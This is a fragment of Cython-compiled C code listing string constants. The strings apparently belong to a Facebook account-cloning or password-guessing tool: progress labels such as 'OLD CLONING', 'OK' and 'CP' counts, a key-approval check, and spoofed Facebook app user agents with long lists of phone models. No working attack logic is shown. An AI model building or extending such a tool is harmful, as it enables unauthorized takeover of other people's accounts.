    {&__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38, __pyx_k_38_5_244m_38_5_244m_38_5_46m_38, sizeof(__pyx_k_38_5_244m_38_5_244m_38_5_46m_38), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_244m_38_5_46m_38_2, __pyx_k_38_5_244m_38_5_244m_38_5_46m_38_2, sizeof(__pyx_k_38_5_244m_38_5_244m_38_5_46m_38_2), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m, __pyx_k_38_5_244m_38_5_46m, sizeof(__pyx_k_38_5_244m_38_5_46m), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46mAYYUB_38_5_24, __pyx_k_38_5_244m_38_5_46mAYYUB_38_5_24, sizeof(__pyx_k_38_5_244m_38_5_46mAYYUB_38_5_24), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5, __pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5, sizeof(__pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2, __pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5_2, sizeof(__pyx_k_38_5_244m_38_5_46mAYYUB_OK_38_5_2), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46mAYYUB_XD_38_5, __pyx_k_38_5_244m_38_5_46mAYYUB_XD_38_5, sizeof(__pyx_k_38_5_244m_38_5_46mAYYUB_XD_38_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46mOK_1_37m_38_5, __pyx_k_38_5_244m_38_5_46mOK_1_37m_38_5, sizeof(__pyx_k_38_5_244m_38_5_46mOK_1_37m_38_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_2, __pyx_k_38_5_244m_38_5_46m_2, sizeof(__pyx_k_38_5_244m_38_5_46m_2), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_3, __pyx_k_38_5_244m_38_5_46m_3, sizeof(__pyx_k_38_5_244m_38_5_46m_3), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m, __pyx_k_38_5_244m_38_5_46m_38_5_244m, sizeof(__pyx_k_38_5_244m_38_5_46m_38_5_244m), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m_38, __pyx_k_38_5_244m_38_5_46m_38_5_244m_38, sizeof(__pyx_k_38_5_244m_38_5_46m_38_5_244m_38), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_2, __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_2, sizeof(__pyx_k_38_5_244m_38_5_46m_38_5_244m_38_2), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_3, __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_3, sizeof(__pyx_k_38_5_244m_38_5_46m_38_5_244m_38_3), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_244m_38_5_46m_38_5_244m_38_4, __pyx_k_38_5_244m_38_5_46m_38_5_244m_38_4, sizeof(__pyx_k_38_5_244m_38_5_46m_38_5_244m_38_4), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_4, __pyx_k_38_5_244m_38_5_46m_4, sizeof(__pyx_k_38_5_244m_38_5_46m_4), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_5, __pyx_k_38_5_244m_38_5_46m_5, sizeof(__pyx_k_38_5_244m_38_5_46m_5), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_6, __pyx_k_38_5_244m_38_5_46m_6, sizeof(__pyx_k_38_5_244m_38_5_46m_6), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_7, __pyx_k_38_5_244m_38_5_46m_7, sizeof(__pyx_k_38_5_244m_38_5_46m_7), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_38_5_46m_8, __pyx_k_38_5_244m_38_5_46m_8, sizeof(__pyx_k_38_5_244m_38_5_46m_8), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_CHOICE, __pyx_k_38_5_244m_38_5_46m_CHOICE, sizeof(__pyx_k_38_5_244m_38_5_46m_CHOICE), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT, __pyx_k_38_5_244m_38_5_46m_DO_YOU_WENT, sizeof(__pyx_k_38_5_244m_38_5_46m_DO_YOU_WENT), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_EXAMPLE_sdca, __pyx_k_38_5_244m_38_5_46m_EXAMPLE_sdca, sizeof(__pyx_k_38_5_244m_38_5_46m_EXAMPLE_sdca), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE, __pyx_k_38_5_244m_38_5_46m_EXIT_DONE, sizeof(__pyx_k_38_5_244m_38_5_46m_EXIT_DONE), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_FILE_LOCATIO, __pyx_k_38_5_244m_38_5_46m_FILE_LOCATIO, sizeof(__pyx_k_38_5_244m_38_5_46m_FILE_LOCATIO), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_FILE_NAME, __pyx_k_38_5_244m_38_5_46m_FILE_NAME, sizeof(__pyx_k_38_5_244m_38_5_46m_FILE_NAME), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_IF_NO_RESULT, __pyx_k_38_5_244m_38_5_46m_IF_NO_RESULT, sizeof(__pyx_k_38_5_244m_38_5_46m_IF_NO_RESULT), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET, __pyx_k_38_5_244m_38_5_46m_NO_INTERNET, sizeof(__pyx_k_38_5_244m_38_5_46m_NO_INTERNET), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F, __pyx_k_38_5_244m_38_5_46m_OPTION_NOT_F, sizeof(__pyx_k_38_5_244m_38_5_46m_OPTION_NOT_F), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_LIM, __pyx_k_38_5_244m_38_5_46m_PASSWORD_LIM, sizeof(__pyx_k_38_5_244m_38_5_46m_PASSWORD_LIM), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_PASSWORD_NO, __pyx_k_38_5_244m_38_5_46m_PASSWORD_NO, sizeof(__pyx_k_38_5_244m_38_5_46m_PASSWORD_NO), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_PASS_38_5_24, __pyx_k_38_5_244m_38_5_46m_PASS_38_5_24, sizeof(__pyx_k_38_5_244m_38_5_46m_PASS_38_5_24), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER, __pyx_k_38_5_244m_38_5_46m_PRESS_ENTER, sizeof(__pyx_k_38_5_244m_38_5_46m_PRESS_ENTER), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS, __pyx_k_38_5_244m_38_5_46m_THE_PROCESS, sizeof(__pyx_k_38_5_244m_38_5_46m_THE_PROCESS), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN, __pyx_k_38_5_244m_38_5_46m_TOTAL_ACCOUN, sizeof(__pyx_k_38_5_244m_38_5_46m_TOTAL_ACCOUN), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP, __pyx_k_38_5_244m_38_5_46m_TOTAL_OK_CP, sizeof(__pyx_k_38_5_244m_38_5_46m_TOTAL_OK_CP), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_4, __pyx_k_38_5_244m_4, sizeof(__pyx_k_38_5_244m_4), 0, 1, 0, 0},
    {&__pyx_kp_u_38_5_244m_5, __pyx_k_38_5_244m_5, sizeof(__pyx_k_38_5_244m_5), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED, __pyx_k_38_5_244m_KEY_IS_NOT_APPROVED, sizeof(__pyx_k_38_5_244m_KEY_IS_NOT_APPROVED), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_46m, __pyx_k_38_5_46m, sizeof(__pyx_k_38_5_46m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_47m, __pyx_k_38_5_47m, sizeof(__pyx_k_38_5_47m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_48m, __pyx_k_38_5_48m, sizeof(__pyx_k_38_5_48m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_49m, __pyx_k_38_5_49m, sizeof(__pyx_k_38_5_49m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_50m, __pyx_k_38_5_50m, sizeof(__pyx_k_38_5_50m), 0, 0, 1, 0},
    {&__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m, __pyx_k_38_5_81mCP_1_37m_38_5_81m, sizeof(__pyx_k_38_5_81mCP_1_37m_38_5_81m), 0, 1, 0, 0},
    {&__pyx_kp_s_38_5_86m, __pyx_k_38_5_86m, sizeof(__pyx_k_38_5_86m), 0, 0, 1, 0},
    {&__pyx_kp_s_38_5_8m, __pyx_k_38_5_8m, sizeof(__pyx_k_38_5_8m), 0, 0, 1, 0},
    {&__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING, __pyx_k_3_38_5_244m_38_5_46m_OLD_CLONING, sizeof(__pyx_k_3_38_5_244m_38_5_46m_OLD_CLONING), 0, 1, 0, 0},
    {&__pyx_kp_s_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 0, 1, 0},
    {&__pyx_kp_s_4YYU8, __pyx_k_4YYU8, sizeof(__pyx_k_4YYU8), 0, 0, 1, 0},
    {&__pyx_kp_s_5, __pyx_k_5, sizeof(__pyx_k_5), 0, 0, 1, 0},
    {&__pyx_kp_u_5, __pyx_k_5, sizeof(__pyx_k_5), 0, 1, 0, 0},
    {&__pyx_kp_u_537_36_Puffin_9_7_2, __pyx_k_537_36_Puffin_9_7_2, sizeof(__pyx_k_537_36_Puffin_9_7_2), 0, 1, 0, 0},
    {&__pyx_kp_u_59, __pyx_k_59, sizeof(__pyx_k_59), 0, 1, 0, 0},
    {&__pyx_kp_s_6, __pyx_k_6, sizeof(__pyx_k_6), 0, 0, 1, 0},
    {&__pyx_kp_s_7, __pyx_k_7, sizeof(__pyx_k_7), 0, 0, 1, 0},
    {&__pyx_kp_s_708090, __pyx_k_708090, sizeof(__pyx_k_708090), 0, 0, 1, 0},
    {&__pyx_kp_s_8, __pyx_k_8, sizeof(__pyx_k_8), 0, 0, 1, 0},
    {&__pyx_kp_s_9, __pyx_k_9, sizeof(__pyx_k_9), 0, 0, 1, 0},
    {&__pyx_kp_s_980, __pyx_k_980, sizeof(__pyx_k_980), 0, 0, 1, 0},
    {&__pyx_n_s_A, __pyx_k_A, sizeof(__pyx_k_A), 0, 0, 1, 1},
    {&__pyx_n_s_A525FXXU3AUG4, __pyx_k_A525FXXU3AUG4, sizeof(__pyx_k_A525FXXU3AUG4), 0, 0, 1, 1},
    {&__pyx_n_s_A715FXXU3ATI8, __pyx_k_A715FXXU3ATI8, sizeof(__pyx_k_A715FXXU3ATI8), 0, 0, 1, 1},
    {&__pyx_n_s_AM, __pyx_k_AM, sizeof(__pyx_k_AM), 0, 0, 1, 1},
    {&__pyx_n_u_AP, __pyx_k_AP, sizeof(__pyx_k_AP), 0, 1, 0, 1},
    {&__pyx_kp_u_AYYUB_CP_38_5_244m, __pyx_k_AYYUB_CP_38_5_244m, sizeof(__pyx_k_AYYUB_CP_38_5_244m), 0, 1, 0, 0},
    {&__pyx_n_s_AYYUB_M1, __pyx_k_AYYUB_M1, sizeof(__pyx_k_AYYUB_M1), 0, 0, 1, 1},
    {&__pyx_n_s_AYYUB_M2, __pyx_k_AYYUB_M2, sizeof(__pyx_k_AYYUB_M2), 0, 0, 1, 1},
    {&__pyx_kp_s_Accept_Encoding, __pyx_k_Accept_Encoding, sizeof(__pyx_k_Accept_Encoding), 0, 0, 1, 0},
    {&__pyx_kp_s_Android, __pyx_k_Android, sizeof(__pyx_k_Android), 0, 0, 1, 0},
    {&__pyx_kp_u_AppleWebKit, __pyx_k_AppleWebKit, sizeof(__pyx_k_AppleWebKit), 0, 1, 0, 0},
    {&__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G, __pyx_k_AppleWebKit_534_30_KHTML_like_G, sizeof(__pyx_k_AppleWebKit_534_30_KHTML_like_G), 0, 1, 0, 0},
    {&__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G, __pyx_k_AppleWebKit_537_36_KHTML_like_G, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_G), 0, 1, 0, 0},
    {&__pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2, __pyx_k_AppleWebKit_537_36_KHTML_like_G_2, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_G_2), 0, 0, 1, 0},
    {&__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3, __pyx_k_AppleWebKit_537_36_KHTML_like_G_3, sizeof(__pyx_k_AppleWebKit_537_36_KHTML_like_G_3), 0, 1, 0, 0},
    {&__pyx_n_s_April, __pyx_k_April, sizeof(__pyx_k_April), 0, 0, 1, 1},
    {&__pyx_n_s_August, __pyx_k_August, sizeof(__pyx_k_August), 0, 0, 1, 1},
    {&__pyx_n_s_Authorization, __pyx_k_Authorization, sizeof(__pyx_k_Authorization), 0, 0, 1, 1},
    {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
    {&__pyx_n_s_BD, __pyx_k_BD, sizeof(__pyx_k_BD), 0, 0, 1, 1},
    {&__pyx_n_s_BD_locals_genexpr, __pyx_k_BD_locals_genexpr, sizeof(__pyx_k_BD_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_kp_s_Black_Shark, __pyx_k_Black_Shark, sizeof(__pyx_k_Black_Shark), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_2, __pyx_k_Black_Shark_2, sizeof(__pyx_k_Black_Shark_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_3, __pyx_k_Black_Shark_3, sizeof(__pyx_k_Black_Shark_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_3S, __pyx_k_Black_Shark_3S, sizeof(__pyx_k_Black_Shark_3S), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_4, __pyx_k_Black_Shark_4, sizeof(__pyx_k_Black_Shark_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_4_Pro, __pyx_k_Black_Shark_4_Pro, sizeof(__pyx_k_Black_Shark_4_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_5, __pyx_k_Black_Shark_5, sizeof(__pyx_k_Black_Shark_5), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_5_Pro, __pyx_k_Black_Shark_5_Pro, sizeof(__pyx_k_Black_Shark_5_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Black_Shark_Helo, __pyx_k_Black_Shark_Helo, sizeof(__pyx_k_Black_Shark_Helo), 0, 0, 1, 0},
    {&__pyx_kp_s_Build, __pyx_k_Build, sizeof(__pyx_k_Build), 0, 0, 1, 0},
    {&__pyx_kp_u_Build, __pyx_k_Build, sizeof(__pyx_k_Build), 0, 1, 0, 0},
    {&__pyx_kp_u_Build_PPR1, __pyx_k_Build_PPR1, sizeof(__pyx_k_Build_PPR1), 0, 1, 0, 0},
    {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1801, __pyx_k_CPH1801, sizeof(__pyx_k_CPH1801), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1803, __pyx_k_CPH1803, sizeof(__pyx_k_CPH1803), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1805, __pyx_k_CPH1805, sizeof(__pyx_k_CPH1805), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1809, __pyx_k_CPH1809, sizeof(__pyx_k_CPH1809), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1827, __pyx_k_CPH1827, sizeof(__pyx_k_CPH1827), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1837, __pyx_k_CPH1837, sizeof(__pyx_k_CPH1837), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1851, __pyx_k_CPH1851, sizeof(__pyx_k_CPH1851), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1853, __pyx_k_CPH1853, sizeof(__pyx_k_CPH1853), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1979, __pyx_k_CPH1979, sizeof(__pyx_k_CPH1979), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1983, __pyx_k_CPH1983, sizeof(__pyx_k_CPH1983), 0, 0, 1, 1},
    {&__pyx_n_s_CPH1987, __pyx_k_CPH1987, sizeof(__pyx_k_CPH1987), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2005, __pyx_k_CPH2005, sizeof(__pyx_k_CPH2005), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2009, __pyx_k_CPH2009, sizeof(__pyx_k_CPH2009), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2015, __pyx_k_CPH2015, sizeof(__pyx_k_CPH2015), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2059, __pyx_k_CPH2059, sizeof(__pyx_k_CPH2059), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2061, __pyx_k_CPH2061, sizeof(__pyx_k_CPH2061), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2065, __pyx_k_CPH2065, sizeof(__pyx_k_CPH2065), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2069, __pyx_k_CPH2069, sizeof(__pyx_k_CPH2069), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2071, __pyx_k_CPH2071, sizeof(__pyx_k_CPH2071), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2073, __pyx_k_CPH2073, sizeof(__pyx_k_CPH2073), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2077, __pyx_k_CPH2077, sizeof(__pyx_k_CPH2077), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2091, __pyx_k_CPH2091, sizeof(__pyx_k_CPH2091), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2095, __pyx_k_CPH2095, sizeof(__pyx_k_CPH2095), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2099, __pyx_k_CPH2099, sizeof(__pyx_k_CPH2099), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2137, __pyx_k_CPH2137, sizeof(__pyx_k_CPH2137), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2139, __pyx_k_CPH2139, sizeof(__pyx_k_CPH2139), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2145, __pyx_k_CPH2145, sizeof(__pyx_k_CPH2145), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2161, __pyx_k_CPH2161, sizeof(__pyx_k_CPH2161), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2185, __pyx_k_CPH2185, sizeof(__pyx_k_CPH2185), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2201, __pyx_k_CPH2201, sizeof(__pyx_k_CPH2201), 0, 0, 1, 1},
    {&__pyx_n_s_CPH2209, __pyx_k_CPH2209, sizeof(__pyx_k_CPH2209), 0, 0, 1, 1},
    {&__pyx_kp_u_Chrome, __pyx_k_Chrome, sizeof(__pyx_k_Chrome), 0, 1, 0, 0},
    {&__pyx_n_s_Civi, __pyx_k_Civi, sizeof(__pyx_k_Civi), 0, 0, 1, 1},
    {&__pyx_kp_s_Civi_2, __pyx_k_Civi_2, sizeof(__pyx_k_Civi_2), 0, 0, 1, 0},
    {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
    {&__pyx_kp_s_Content_Type, __pyx_k_Content_Type, sizeof(__pyx_k_Content_Type), 0, 0, 1, 0},
    {&__pyx_n_s_D, __pyx_k_D, sizeof(__pyx_k_D), 0, 0, 1, 1},
    {&__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_k_Davik_2_1_0_Linux_U_Android, sizeof(__pyx_k_Davik_2_1_0_Linux_U_Android), 0, 0, 1, 0},
    {&__pyx_n_s_December, __pyx_k_December, sizeof(__pyx_k_December), 0, 0, 1, 1},
    {&__pyx_n_s_Devember, __pyx_k_Devember, sizeof(__pyx_k_Devember), 0, 0, 1, 1},
    {&__pyx_n_s_EPE54B, __pyx_k_EPE54B, sizeof(__pyx_k_EPE54B), 0, 0, 1, 1},
    {&__pyx_n_s_EX, __pyx_k_EX, sizeof(__pyx_k_EX), 0, 0, 1, 1},
    {&__pyx_n_s_EXCELLENT, __pyx_k_EXCELLENT, sizeof(__pyx_k_EXCELLENT), 0, 0, 1, 1},
    {&__pyx_n_s_F916BXXU1BTKF, __pyx_k_F916BXXU1BTKF, sizeof(__pyx_k_F916BXXU1BTKF), 0, 0, 1, 1},
    {&__pyx_n_s_FB4A, __pyx_k_FB4A, sizeof(__pyx_k_FB4A), 0, 0, 1, 1},
    {&__pyx_kp_s_FBAN, __pyx_k_FBAN, sizeof(__pyx_k_FBAN), 0, 0, 1, 0},
    {&__pyx_kp_s_FBAN_FB4A_FBAV, __pyx_k_FBAN_FB4A_FBAV, sizeof(__pyx_k_FBAN_FB4A_FBAV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB, __pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB, sizeof(__pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB), 0, 0, 1, 0},
    {&__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2, __pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2, sizeof(__pyx_k_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2), 0, 0, 1, 0},
    {&__pyx_kp_s_FBAV, __pyx_k_FBAV, sizeof(__pyx_k_FBAV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBBD, __pyx_k_FBBD, sizeof(__pyx_k_FBBD), 0, 0, 1, 0},
    {&__pyx_kp_s_FBBV, __pyx_k_FBBV, sizeof(__pyx_k_FBBV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBCR, __pyx_k_FBCR, sizeof(__pyx_k_FBCR), 0, 0, 1, 0},
    {&__pyx_kp_s_FBDM_density_2_625_width_1080_h, __pyx_k_FBDM_density_2_625_width_1080_h, sizeof(__pyx_k_FBDM_density_2_625_width_1080_h), 0, 0, 1, 0},
    {&__pyx_kp_s_FBDV, __pyx_k_FBDV, sizeof(__pyx_k_FBDV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBMF, __pyx_k_FBMF, sizeof(__pyx_k_FBMF), 0, 0, 1, 0},
    {&__pyx_kp_s_FBOP_19_FBCA, __pyx_k_FBOP_19_FBCA, sizeof(__pyx_k_FBOP_19_FBCA), 0, 0, 1, 0},
    {&__pyx_kp_s_FBPN, __pyx_k_FBPN, sizeof(__pyx_k_FBPN), 0, 0, 1, 0},
    {&__pyx_kp_s_FBRV, __pyx_k_FBRV, sizeof(__pyx_k_FBRV), 0, 0, 1, 0},
    {&__pyx_kp_s_FBSV, __pyx_k_FBSV, sizeof(__pyx_k_FBSV), 0, 0, 1, 0},
    {&__pyx_n_s_February, __pyx_k_February, sizeof(__pyx_k_February), 0, 0, 1, 1},
    {&__pyx_n_s_FileNotFoundError, __pyx_k_FileNotFoundError, sizeof(__pyx_k_FileNotFoundError), 0, 0, 1, 1},
    {&__pyx_n_s_First, __pyx_k_First, sizeof(__pyx_k_First), 0, 0, 1, 1},
    {&__pyx_n_s_G, __pyx_k_G, sizeof(__pyx_k_G), 0, 0, 1, 1},
    {&__pyx_n_s_G1, __pyx_k_G1, sizeof(__pyx_k_G1), 0, 0, 1, 1},
    {&__pyx_n_s_G2, __pyx_k_G2, sizeof(__pyx_k_G2), 0, 0, 1, 1},
    {&__pyx_n_s_G3, __pyx_k_G3, sizeof(__pyx_k_G3), 0, 0, 1, 1},
    {&__pyx_n_s_G4, __pyx_k_G4, sizeof(__pyx_k_G4), 0, 0, 1, 1},
    {&__pyx_n_s_G5, __pyx_k_G5, sizeof(__pyx_k_G5), 0, 0, 1, 1},
    {&__pyx_n_s_G950FXXS5DSF1, __pyx_k_G950FXXS5DSF1, sizeof(__pyx_k_G950FXXS5DSF1), 0, 0, 1, 1},
    {&__pyx_n_s_G950FXXS6DTA1, __pyx_k_G950FXXS6DTA1, sizeof(__pyx_k_G950FXXS6DTA1), 0, 0, 1, 1},
    {&__pyx_n_s_G950FXXS8DTC6, __pyx_k_G950FXXS8DTC6, sizeof(__pyx_k_G950FXXS8DTC6), 0, 0, 1, 1},
    {&__pyx_n_s_G950FXXU3CRGH, __pyx_k_G950FXXU3CRGH, sizeof(__pyx_k_G950FXXU3CRGH), 0, 0, 1, 1},
    {&__pyx_n_s_G950FXXU4DSBA, __pyx_k_G950FXXU4DSBA, sizeof(__pyx_k_G950FXXU4DSBA), 0, 0, 1, 1},
    {&__pyx_n_s_G975USQU4ETG1, __pyx_k_G975USQU4ETG1, sizeof(__pyx_k_G975USQU4ETG1), 0, 0, 1, 1},
    {&__pyx_n_s_G985FXXU7DTJ2, __pyx_k_G985FXXU7DTJ2, sizeof(__pyx_k_G985FXXU7DTJ2), 0, 0, 1, 1},
    {&__pyx_n_s_G998USQU1ATCU, __pyx_k_G998USQU1ATCU, sizeof(__pyx_k_G998USQU1ATCU), 0, 0, 1, 1},
    {&__pyx_n_s_GET, __pyx_k_GET, sizeof(__pyx_k_GET), 0, 0, 1, 1},
    {&__pyx_kp_s_GT_I9190, __pyx_k_GT_I9190, sizeof(__pyx_k_GT_I9190), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9192, __pyx_k_GT_I9192, sizeof(__pyx_k_GT_I9192), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9300, __pyx_k_GT_I9300, sizeof(__pyx_k_GT_I9300), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9300I, __pyx_k_GT_I9300I, sizeof(__pyx_k_GT_I9300I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9301I, __pyx_k_GT_I9301I, sizeof(__pyx_k_GT_I9301I), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_I9500, __pyx_k_GT_I9500, sizeof(__pyx_k_GT_I9500), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N5100, __pyx_k_GT_N5100, sizeof(__pyx_k_GT_N5100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N7100, __pyx_k_GT_N7100, sizeof(__pyx_k_GT_N7100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_N8000, __pyx_k_GT_N8000, sizeof(__pyx_k_GT_N8000), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P3110, __pyx_k_GT_P3110, sizeof(__pyx_k_GT_P3110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5100, __pyx_k_GT_P5100, sizeof(__pyx_k_GT_P5100), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5110, __pyx_k_GT_P5110, sizeof(__pyx_k_GT_P5110), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5200, __pyx_k_GT_P5200, sizeof(__pyx_k_GT_P5200), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5210, __pyx_k_GT_P5210, sizeof(__pyx_k_GT_P5210), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_P5220, __pyx_k_GT_P5220, sizeof(__pyx_k_GT_P5220), 0, 0, 1, 0},
    {&__pyx_kp_s_GT_S7390, __pyx_k_GT_S7390, sizeof(__pyx_k_GT_S7390), 0, 0, 1, 0},
    {&__pyx_n_s_HLK75C, __pyx_k_HLK75C, sizeof(__pyx_k_HLK75C), 0, 0, 1, 1},
    {&__pyx_n_s_HLK75F, __pyx_k_HLK75F, sizeof(__pyx_k_HLK75F), 0, 0, 1, 1},
    {&__pyx_n_s_HLK75H, __pyx_k_HLK75H, sizeof(__pyx_k_HLK75H), 0, 0, 1, 1},
    {&__pyx_n_s_HRI83, __pyx_k_HRI83, sizeof(__pyx_k_HRI83), 0, 0, 1, 1},
    {&__pyx_n_s_Hongmi, __pyx_k_Hongmi, sizeof(__pyx_k_Hongmi), 0, 0, 1, 1},
    {&__pyx_kp_s_Hongmi_1S, __pyx_k_Hongmi_1S, sizeof(__pyx_k_Hongmi_1S), 0, 0, 1, 0},
    {&__pyx_kp_s_Hongmi_2, __pyx_k_Hongmi_2, sizeof(__pyx_k_Hongmi_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Hongmi_2_3G, __pyx_k_Hongmi_2_3G, sizeof(__pyx_k_Hongmi_2_3G), 0, 0, 1, 0},
    {&__pyx_kp_s_Hongmi_2_4G, __pyx_k_Hongmi_2_4G, sizeof(__pyx_k_Hongmi_2_4G), 0, 0, 1, 0},
    {&__pyx_kp_s_Hongmi_4G, __pyx_k_Hongmi_4G, sizeof(__pyx_k_Hongmi_4G), 0, 0, 1, 0},
